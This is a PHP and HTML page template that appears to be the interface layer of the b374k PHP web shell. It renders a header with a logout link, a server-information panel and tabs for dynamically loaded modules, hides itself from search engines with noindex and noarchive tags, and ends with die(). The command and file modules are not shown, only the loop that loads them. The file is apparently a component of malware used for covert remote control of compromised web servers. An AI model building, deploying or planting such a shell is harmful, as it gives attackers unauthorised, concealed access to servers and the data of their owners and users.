<?php
	$error = @ob_get_contents();
	$error_html = (!empty($error))?"<div class='phpError border'>".html_safe($error)."</div>":"";
	@ob_end_clean();

?><!doctype html>
<html>
<head>
<title><?php echo $GLOBALS['title']." ".$GLOBALS['ver'];?></title>
<meta charset='utf-8'>
<meta name='robots' content='noindex, nofollow, noarchive'>
<link rel='SHORTCUT ICON' href='<?php echo get_resource('b374k');?>'>
<style type="text/css">
<__CSS__>
#navigation{position:fixed;left:-16px;top:46%;}
#totop,#tobottom{background:url('<?php echo get_resource('arrow');?>');width:32px;height:32px;opacity:0.30;margin:18px 0;}
#totop:hover,#tobottom:hover{opacity:0.80;}
#tobottom{-webkit-transform:scaleY(-1);-moz-transform:scaleY(-1);-o-transform:scaleY(-1);transform:scaleY(-1);filter:FlipV;-ms-filter:"FlipV";}
</style>
</head>
<body>
<!--wrapper start-->
<div id='wrapper'>
	<!--header start-->
	<div id='header'>
		<!--header info start-->
		<div id='headerNav'>
			<span><a style='font-weight:bold;' onclick="set_cookie('cwd', '');" href='<?php echo get_self(); ?>'><?php echo $GLOBALS['title']." ".$GLOBALS['ver']?></a></span>
			<img onclick='viewfileorfolder();' id='b374k' src='<?php echo get_resource('b374k');?>' />
			<span id='nav'><?php echo $nav; ?></span>

			<a id='logout'>log out</a>
		</div>
		<!--header info end-->

		<!--menu start-->
		<div id='menu'>
			<?php
				foreach($GLOBALS['module_to_load'] as $k){
					echo "<a class='menuitem' id='menu".$GLOBALS['module'][$k]['id']."' href='#!".$GLOBALS['module'][$k]['id']."'>".$GLOBALS['module'][$k]['title']."</a>";
				}
			?>
		</div>
		<!--menu end-->

	</div>
	<!--header end-->

	<!--content start-->
	<div id='content'>
		<!--server info start-->
		<div id='basicInfo'>
			<?php
			echo $error_html;
			foreach(get_server_info() as $k=>$v){
				echo "<div>".$v."</div>";
			}
			?>
		</div>
		<!--server info end-->

		<?php
			foreach($GLOBALS['module_to_load'] as $k){
				$content = $GLOBALS['module'][$k]['content'];
				echo "<div class='menucontent' id='".$GLOBALS['module'][$k]['id']."'>".$content."</div>";
			}
		?>
	</div>
	<!--content end-->

</div>
<!--wrapper end-->
<div id='navigation'>
	<div id='totop'></div>
	<div id='tobottom'></div>
</div>
<table id="overlay"><tr><td><div id="loading" ondblclick='loading_stop();'></div></td></tr></table>
<form method='post' id='form' target='_blank'></form>
<!--script start-->
<script type='text/javascript'>
var targeturl = '<?php echo get_self();?>';
var module_to_load = '<?php echo implode(",", $GLOBALS['module_to_load']);?>';
var win = <?php echo (is_win())?'true':'false';?>;

<__ZEPTO__>
<__JS__>

<?php
	foreach($GLOBALS['module_to_load'] as $k){
		echo "function ".$GLOBALS['module'][$k]['id']."(){ ".$GLOBALS['module'][$k]['js_ontabselected']." }\n";
	}
?>
</script>
<!--script end-->
</body>
</html><?php die();?>